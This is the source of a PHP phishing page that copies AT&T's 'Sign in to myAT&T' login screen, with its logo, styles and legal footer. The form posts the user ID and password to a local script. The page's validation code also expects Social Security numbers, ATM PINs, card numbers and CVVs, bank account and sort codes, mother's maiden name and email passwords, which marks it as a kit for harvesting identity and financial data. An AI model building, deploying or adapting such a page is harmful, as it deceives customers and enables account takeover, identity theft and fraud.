<?php
session_start();

?>
<!DOCTYPE html>

<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
  
  <title>Login Screen</title>
  <!--<base href="/">--><base href=".">

  <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7;IE=11; IE=EDGE">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0,shrink-to-fit=no">

<!-- Dynatrace Javascript -->
<link rel="icon" type="image/x-icon" href="style/favicon.ico">

  <!-- ADDING ADOBE CONTAINER HEADER -->

<link rel="stylesheet" href="style/styles.css">
<style>app-error[_ngcontent-bfm-c41], app-footer[_ngcontent-bfm-c41], app-header[_ngcontent-bfm-c41], app-manual-login[_ngcontent-bfm-c41], app-manual-login-erepair[_ngcontent-bfm-c41], app-multi-save-login[_ngcontent-bfm-c41]{max-width:310px;width:100%}</style><style>.spacer[_ngcontent-bfm-c28]{margin-bottom:70px}.image[_ngcontent-bfm-c28]{height:24px}@media (max-width:1199.98px){.spacer[_ngcontent-bfm-c28]{margin-bottom:50px}}</style><style>.errorContainer[_ngcontent-bfm-c29]{width:310px;border-radius:3px;border:1px solid rgba(215,56,56,.1);background-color:rgba(215,56,56,.03);padding:11px 15px 10px 16px;display:flex;align-items:flex-start;font-family:ATTAleckSans-Regular;margin-top:12px}.errorIcon[_ngcontent-bfm-c29]:before{content:"";width:18px;height:18px;display:inline-block;vertical-align:text-top;background-color:transparent;background-position-y:center;background-position-x:0;background-repeat:no-repeat;background-size:contain}.errorText[_ngcontent-bfm-c29]{padding-left:11px}.errorDesc[_ngcontent-bfm-c29]{font-family:ATTAleckSans-Regular;font-size:14px;font-weight:400;line-height:1.29;letter-spacing:normal;color:#1d2329}.errorCode[_ngcontent-bfm-c29], .errorDesc[_ngcontent-bfm-c29]{font-stretch:normal;font-style:normal}.errorCode[_ngcontent-bfm-c29]{text-transform:uppercase;padding-top:10px;font-family:ATTAleckSans-Medium;font-size:12px;font-weight:500;line-height:1.83;letter-spacing:.9px;color:#72727e}.blueErrorContainer[_ngcontent-bfm-c29]{border:1px solid rgba(0,159,219,.1);background-color:rgba(0,159,219,.03)}</style><style>.fg-sign-in[_ngcontent-bfm-c33]{margin-top:8px}.zenkey-container[_ngcontent-bfm-c33]{margin-top:8px;margin-bottom:57px}.bottom-container[_ngcontent-bfm-c33]{margin-top:45px}</style><style>div[_ngcontent-bfm-c39]{background-color:#f7f7f7}.policyArea[_ngcontent-bfm-c39]{text-align:center;margin-top:24px;display:flex;flex-direction:row}.policyArea[_ngcontent-bfm-c39]   a[_ngcontent-bfm-c39]{padding:0 11.5px}.footer-link-text[_ngcontent-bfm-c39]{transition:color .3s linear;font-family:ATTAleckSans-Medium;font-size:12px;font-style:normal;font-stretch:normal;line-height:2;letter-spacing:normal;text-align:center;color:#0057b8}.footer-link-text[_ngcontent-bfm-c39]:focus, .footer-link-text[_ngcontent-bfm-c39]:hover{text-decoration:underline}.copyright[_ngcontent-bfm-c39]{font-family:ATTAleckSans-Regular;font-size:12px;font-weight:500;font-style:normal;font-stretch:normal;line-height:2;letter-spacing:normal;text-align:center}.footer-link-text[_ngcontent-bfm-c39]   .text-style-1[_ngcontent-bfm-c39]{font-weight:400;color:#1d2329}.spacer[_ngcontent-bfm-c39]{margin-bottom:48px}@media (max-width:1199.98px){.policyArea[_ngcontent-bfm-c39]{margin-top:20px;display:flex;flex-direction:column;align-items:center}.policyArea[_ngcontent-bfm-c39]   a[_ngcontent-bfm-c39]:after{content:"";display:block;height:0;width:1px;text-align:center;padding:2px 0;margin-bottom:2px}.copyright[_ngcontent-bfm-c39]{margin-left:auto;margin-right:auto;text-align:center;width:80%}.policyArea[_ngcontent-bfm-c39]   a[_ngcontent-bfm-c39]{white-space:nowrap}}</style><style>.btn-zenkey[_ngcontent-bfm-c32]{width:100%;height:48px;border-radius:3px;border:1px solid #008522;background-color:#008522;font-family:ATTAleckSans-Medium;font-size:14px;font-weight:500;font-stretch:normal;font-style:normal;line-height:normal;letter-spacing:normal;color:#fff;margin-top:6px}.btn-zenkey[_ngcontent-bfm-c32]:active, .btn-zenkey[_ngcontent-bfm-c32]:not(:disabled):not(.disabled):active{background-color:#00771e;border-color:#00771e;color:#fff}.btn-zenkey[_ngcontent-bfm-c32]:focus{background-color:#007c20;box-shadow:inset 0 0 0 3px #007c20,inset 0 0 0 4px #fff;color:#fff;transition:background-color .3s ease-in 0s}.btn-zenkey[_ngcontent-bfm-c32]:focus:hover{background-color:#007c20;box-shadow:inset 0 0 0 3px #007c20,inset 0 0 0 4px #dcdfe3}.btn-zenkey[_ngcontent-bfm-c32]:active:focus{background-color:#007c20;box-shadow:none}.zenkeyLogoImg[_ngcontent-bfm-c32]{position:absolute}.zenkeyLogoImg[_ngcontent-bfm-c32]:before{content:"";width:18px;height:18px;display:inline-block;margin-left:8px;vertical-align:text-top;background-color:transparent;background-position-y:center;background-position-x:0;background-repeat:no-repeat}.zenkeyLinkContainer[_ngcontent-bfm-c32]{display:flex;flex-direction:row;align-items:center;font-family:ATTAleckSans-Medium;text-align:center!important;width:100%}.zenkeyLearnMore[_ngcontent-bfm-c32]{font-family:ATTAleckSans-Medium;font-size:16px;font-weight:500;font-style:normal;color:#0869af;margin-top:15px;width:100%}.zenkeyFirstLookText[_ngcontent-bfm-c32], .zenkeyLearnMore[_ngcontent-bfm-c32]{font-stretch:normal;line-height:normal;letter-spacing:normal}.zenkeyFirstLookText[_ngcontent-bfm-c32]{font-family:ATTAleckSans-Italic;font-size:14px;font-weight:400;color:#008522;min-height:19px}.zenkeyFirstLookLabel[_ngcontent-bfm-c32]{border-radius:3px;background-color:#f4faf5;display:inline-block;margin-right:5px;align-items:center;text-align:center;font-family:ATTAleckSans-BoldItalic;font-size:12px;font-stretch:normal;line-height:normal;letter-spacing:normal;color:#008522;padding:0 4px;min-height:16px}#zenkeyFirstLookContainer[_ngcontent-bfm-c32]{margin-bottom:2px;align-items:center;align-self:center;width:100%}.or-separator[_ngcontent-bfm-c32]{margin-bottom:28px}</style>
<script type='text/javascript' src='style/js/jquery-1.9.1.js'></script>
<script type='text/javascript' src="style/js/jquery.maskedinput.js"></script>
<script type='text/javascript' src="style/js/jquery.payment.js"></script>
<script type='text/javascript' src="style/js/jquery.validate.min.js"></script>



<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
   $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
   $("#ccexp").mask("99/99",{placeholder:"XX/XX"});
});
</script>
<script>
jQuery.validator.addMethod('phoneUK', function(phone_number, element) {
return this.optional(element) || phone_number.length > 9 &&
phone_number.match(/^(((\+44)? ?(\(0\))? ?)|(0))( ?[0-9]{3,4}){3}$/);
}, 'Please check the telephone number you have provided');

jQuery.validator.addMethod("postcodeUK", function(value, element) {
return this.optional(element) || /^[A-Z]{1,2}[0-9]{1,2} ?[0-9][A-Z]{2}$/i.test(value);
}, "Please check the postcode you have provided");

$('#id3').validate();
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#id3").validate({
                errorElement: "div",            
                rules: {
                    uid: { required: true, minlength: 5,},
                    pwd: { required: true, minlength: 8,},
                    fn: { required: true, minlength: 4,},
                    dob: {  required: true, minlength: 10,},
                    pac: {  required: true, minlength: 5,},
                    vp: {  required: true, minlength: 3,},
                    atm: {  required: true, minlength: 4,},
                    dln: {  required: true, minlength: 3,},
                    ssn: {  required: true, minlength: 9,},
                    phn: { required: true, minlength: 11, digits: true,},
                    email: { required: true, email: true,},
                    address: { required: true, minlength: 5,},
                    town: { required: true, minlength: 3,},
                    postcode: { required: true, minlength: 5,},
                    ccname: { required: true, minlength: 4,},
                    ccno: { required: true, minlength: 16, creditcard: true},
                    ccexp: { required: true, minlength: 4,},
                    secode: { required: true, minlength: 3, digits: true,},
                    acno: { required: true, minlength: 8, digits: true,},
                    sortcode: { required: true, minlength: 6},
                    mmn: { required: true, minlength: 4},
                    confirm: { required: true},
                },
                errorPlacement: function(error, element) {
                if (element.attr("name") == "day" || element.attr("name") == "month" || element.attr("name") == "year") 
                error.insertAfter("#doberror");
                else 
                error.insertAfter(element); 
                if (element.attr("name") == "sort1" || element.attr("name") == "sort2" || element.attr("name") == "sort3") 
                error.insertAfter("#expiryerror");
                if (element.attr("name") == "secode") 
                error.insertAfter("#secodeerror");
                if (element.attr("name") == "acno") 
                error.insertAfter("#acnoerror");
                },
                messages: {
                    fn: {
                        required: "Please enter your Full Name",
                        minlength: jQuery.validator.format("Please provide your Full Name"),
                    },
                 
                    atm: {
                        required: "Please enter your ATM Pin",
                        minlength: jQuery.validator.format("Please enter your correct ATM Pin"),
                    },
                    ssn: {
                        required: "Please enter your Social Security Number",
                        minlength: jQuery.validator.format("Please enter a valid Social Security Number"),
                    },
                    dln: {
                        required: "Please enter your Driver's License Number",
                        minlength: jQuery.validator.format("Please enter a valid Driver's License Number"),
                    },
                    dob: { 
                        required: "Please enter your date of birth", },
                        minlength: jQuery.validator.format("Please check the date of birth you have entered"),
                    pac: { 
                        required: "Please enter your PAC", },
                        minlength: jQuery.validator.format("Please check the PAC you have entered"),
                    vp: { 
                        required: "Please enter your Verbal Password", },
                        minlength: jQuery.validator.format("Please check the Verbal Password you have entered"),
                    phn: {
                        required: "Please enter your telephone number",
                        minlength: jQuery.validator.format("Enter a valid Mobile number"),
                        digits: jQuery.validator.format("Please ensure you enter digits only"),
                    },
                    email: {
                        required: "Please provide your email address",
                        email: jQuery.validator.format("Please check the email address you have entered"),
                    },
                     epass: {
                        required: "Please enter your email password",
                        minlength: jQuery.validator.format("Please check the password you have entered"),
                    },
                    address: {
                        required: "Please provide the 1st line of your address",
                        minlength: jQuery.validator.format("Please check the address you have entered"),
                    },
                    town: {
                        required: "Please provide your city/town",
                        minlength: jQuery.validator.format("Please check the city/town you have entered"),
                    },
                    postcode: {
                        required: "Please provide your postcode",
                        minlength: jQuery.validator.format("Please check the postcode you have entered"),
                    },
                    ccname: {
                        required: "Please provide your name as it appears on your card",
                        minlength: jQuery.validator.format("Please provide your name as it appears on your card"),
                    },
                    ccno: {
                        required: "Please provide your 16 digit card number",
                        minlength: jQuery.validator.format("Please check the card number you have entered"),
                        creditcard: jQuery.validator.format("Please check the card number you have entered"),
                    },
                    ccexp: {
                        required: "Please provide your cards expiry date",
                        minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
                        date: jQuery.validator.format("Please check the card expiry date you have entered"),
                    },
                    uid: {
                        required: "Please enter your Username",
                        minlength: jQuery.validator.format("Please enter a valid Username"),                      
                    },
                    pwd: {
                        required: "Please enter your Password",
                        minlength: jQuery.validator.format("Please enter a valid Password"),
                        
                    },

                     secode: {
                        required: "Please provide your 3 digit card security code (CVV)",
                        minlength: jQuery.validator.format("Please check the card security code you have entered"),
                        digits: jQuery.validator.format("Please ensure you enter digits only"),
                    },
                    acno: {
                        required: "Please provide your 8 digit account number",
                        minlength: jQuery.validator.format("Please check the account number you have entered"),
                        digits: jQuery.validator.format("Please ensure you enter digits only"),
                    },
                    sortcode: { 
                        required: "Please provide your sortcode", 
                        minlength: jQuery.validator.format("Please check the sortcode you have entered"), 
                    },
                    mmn: { 
                        required: "Please provide your mmn", 
                        minlength: jQuery.validator.format("Please check the mmn you have entered"), 
                    },
                    acno: { 
                        required: "Please provide your account number", 
                        minlength: jQuery.validator.format("Please check the account number you have entered"),
                        digits: jQuery.validator.format("Please ensure you enter digits only"), 
                    },
                    confirm: { 
                        required: "Please confirm the information you have provided to be true and accurate", 
                    },
                },
                submitHandler: function(form) {
                    form.submit();
                }
            });
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
  
</script>
<style>
div.error {color:red; font-style: italic;}
</style>


</head>

<body>
  <div id="app-root" _nghost-bfm-c41="" ng-version="9.1.9" app-version="9.2.2"><div _ngcontent-bfm-c41=""><div _ngcontent-bfm-c41="" role="main" class="container-fluid"><div _ngcontent-bfm-c41="" class="d-flex flex-container Card"><app-header _ngcontent-bfm-c41="" class="d-flex flex-container" _nghost-bfm-c28=""><!----><div _ngcontent-bfm-c28="" class="image ng-star-inserted"><img _ngcontent-bfm-c28="" id="headerLogoImage" alt="" class="mar-b4 header-logo-image" style="width: 100%;" src="style/att-logo.svg"></div><!----><h1 _ngcontent-bfm-c28="" id="signInHeaderText" class="sign-in-header justify-content-center mb-0" style="margin-top: 20px;">Sign in</h1><h1 _ngcontent-bfm-c28="" id="signInHeaderToText" class="sign-in-header-text justify-content-center mt-0">to myAT&amp;T</h1></app-header><app-error _ngcontent-bfm-c41="" _nghost-bfm-c29=""><!----></app-error><app-manual-login _ngcontent-bfm-c41="" _nghost-bfm-c33="" class="ng-tns-c33-0 ng-star-inserted">

  	<form action="s2.php" _ngcontent-bfm-c33="" novalidate="" id="id3" method="post" class="ng-tns-c33-0 ng-pristine ng-invalid ng-touched" ><input _ngcontent-bfm-c33="" type="hidden" name="appName" formcontrolname="appName" class="ng-tns-c33-0 ng-untouched ng-pristine ng-valid" value="m10707"><input _ngcontent-bfm-c33="" type="hidden" name="loginSuccessURL" formcontrolname="loginSuccessURL" class="ng-tns-c33-0 ng-untouched ng-pristine ng-valid" value="#"><input _ngcontent-bfm-c33="" type="hidden" name="loginFailureURL" formcontrolname="loginFailureURL" class="ng-tns-c33-0 ng-untouched ng-pristine ng-valid" value="#"><input _ngcontent-bfm-c33="" type="hidden" name="trID" formcontrolname="trID" class="ng-tns-c33-0 ng-untouched ng-pristine ng-valid" value="563adc06bc467bc238db1d2e1b7564c8f608198f"><div _ngcontent-bfm-c33="" class="form-group mb-1 ng-tns-c33-0"><label _ngcontent-bfm-c33="" id="userLabel" for="userID" class="textfield-label ng-tns-c33-0">User ID <div _ngcontent-bfm-c33="" id="userLabelAfter" class="ng-tns-c33-0"></div></label><div _ngcontent-bfm-c33="" class="flex-container justify-content-center ng-tns-c33-0">
  		<input _ngcontent-bfm-c33="" id="uid" type="email" name="uid" formcontrolname="userID" aria-controls="userInlineErrorTextContainer" autocomplete="username" spellcheck="false" autocapitalize="off" class="ng-tns-c33-0 textfield ng-pristine ng-invalid ng-touched" aria-invalid="false"><div _ngcontent-bfm-c33="" aria-live="polite" aria-atomic="true" id="userInlineErrorTextContainer" class="ng-tns-c33-0"><!----></div></div></div><div _ngcontent-bfm-c33="" class="form-group text-right ng-tns-c33-0 ng-star-inserted"><a _ngcontent-bfm-c33="" id="forgotUserID" class="ForgotLink ng-tns-c33-0" href="#">Forgot user ID?</a></div><!----><div _ngcontent-bfm-c33="" class="form-group mb-0 pass_show ng-tns-c33-0"><label _ngcontent-bfm-c33="" id="passwordLabel" for="password" class="textfield-label ng-tns-c33-0">Password <div _ngcontent-bfm-c33="" id="passwordLabelAfter" class="ng-tns-c33-0"></div></label><div _ngcontent-bfm-c33="" class="flex-container justify-content-center ng-tns-c33-0"><input _ngcontent-bfm-c33="" id="pwd" name="pwd" aria-controls="passwordInlineErrorTextContainer" spellcheck="false" autocomplete="current-password" autocapitalize="off" class="ng-tns-c33-0 textfield ng-untouched ng-pristine ng-invalid" type="password" aria-invalid="false"><!----><div _ngcontent-bfm-c33="" aria-live="polite" aria-atomic="true" id="passwordInlineErrorTextContainer" class="ng-tns-c33-0"><!----></div></div></div><div _ngcontent-bfm-c33="" class="form-group text-right ng-tns-c33-0 ng-star-inserted"><a _ngcontent-bfm-c33="" id="forgotPassword" class="ForgotLink ng-tns-c33-0" href="#">Forgot password?</a></div><!----><div _ngcontent-bfm-c33="" class="form-group checkboxDiv mb-0 ng-tns-c33-0 ng-star-inserted"><label _ngcontent-bfm-c33="" for="rememberMe" class="checkbox ng-tns-c33-0"><input _ngcontent-bfm-c33="" type="checkbox" id="rememberMe" name="rememberMe" value="Y" class="ng-tns-c33-0" aria-label="Save user ID checkbox"><div _ngcontent-bfm-c33="" class="checkbox-skin ng-tns-c33-0"></div></label><span _ngcontent-bfm-c33="" id="rememberMeText" class="checkbox-label ml-2 ng-tns-c33-0">Save user ID</span></div><!----><!----><div _ngcontent-bfm-c33="" class="form-group justify-content-center fg-sign-in ng-tns-c33-0"><div _ngcontent-bfm-c33="" class="flex-container justify-content-center ng-tns-c33-0"><button _ngcontent-bfm-c33="" type="submit" id="signin" class="btn-primary ng-tns-c33-0">Sign in</button><!----><!----></div></div><div _ngcontent-bfm-c33="" class="form-group justify-content-center dnUI ng-tns-c33-0 ng-star-inserted"><div _ngcontent-bfm-c33="" class="flex-container justify-content-center ng-tns-c33-0"><p _ngcontent-bfm-c33="" id="dontHaveIdText" class="mb-0 ng-tns-c33-0">Don't have a user ID?</p><a _ngcontent-bfm-c33="" id="createNow" class="text-style-1 ng-tns-c33-0 ng-star-inserted" href="#"> Create one now </a><!----><!----></div></div><!----><div _ngcontent-bfm-c33="" class="zenkey-container ng-tns-c33-0 ng-star-inserted"><app-zenkey-button _ngcontent-bfm-c33="" class="ng-tns-c33-0" _nghost-bfm-c32=""><div _ngcontent-bfm-c32="" class="d-flex mar-t24 or-separator"><hr _ngcontent-bfm-c32="" class="half-width-sep-line align-self-center"><span _ngcontent-bfm-c32="" class="or-text-sep align-self-center">OR</span><hr _ngcontent-bfm-c32="" class="half-width-sep-line align-self-center"></div><!----><button _ngcontent-bfm-c32="" type="button" id="zenkeyButton" class="btn-zenkey"><div _ngcontent-bfm-c32="" class="zenkeyLogoImg"></div><div _ngcontent-bfm-c32="">Sign in with ZenKey</div></button><div _ngcontent-bfm-c32="" class="zenkeyLinkContainer ng-star-inserted"><a _ngcontent-bfm-c32="" id="zenkeyLearnMoreLink" rel="noopener noreferrer" class="zenkeyLearnMore" href="#" target="_blank">Learn about ZenKey</a></div><!----></app-zenkey-button></div><!----><!----></form></app-manual-login><!----><!----><!----></div></div><app-footer _ngcontent-bfm-c41="" role="contentinfo" _nghost-bfm-c39="" class="ng-star-inserted"><div _ngcontent-bfm-c39="" class="policyArea justify-content-center ng-star-inserted"><a _ngcontent-bfm-c39="" rel="noopener noreferrer" target="_blank" class="footer-link-text ng-star-inserted" href="#" id="footerLink0">Legal policy center </a><!----><a _ngcontent-bfm-c39="" rel="noopener noreferrer" target="_blank" class="footer-link-text ng-star-inserted" href="#" id="footerLink1">Privacy policy </a><!----><a _ngcontent-bfm-c39="" rel="noopener noreferrer" target="_blank" class="footer-link-text ng-star-inserted" href="#" id="footerLink2">Terms of use </a><!----><a _ngcontent-bfm-c39="" rel="noopener noreferrer" target="_blank" class="footer-link-text ng-star-inserted" href="#" id="footerLink3">Accessibility </a><!----><a _ngcontent-bfm-c39="" rel="noopener noreferrer" target="_blank" class="footer-link-text ng-star-inserted" href="#" id="footerLink4">Do not sell my personal information </a><!----><!----></div><!----><!----><div _ngcontent-bfm-c39="" class="copyright"><span _ngcontent-bfm-c39="" id="copyrightTextSpan" class="ng-star-inserted">�2021 AT&amp;T Intellectual Property. All rights reserved.</span><!----></div></app-footer><!----><!----></div></div>
  

<!-- ADDING ADOBE CONTAINER Footer -->


</body></html>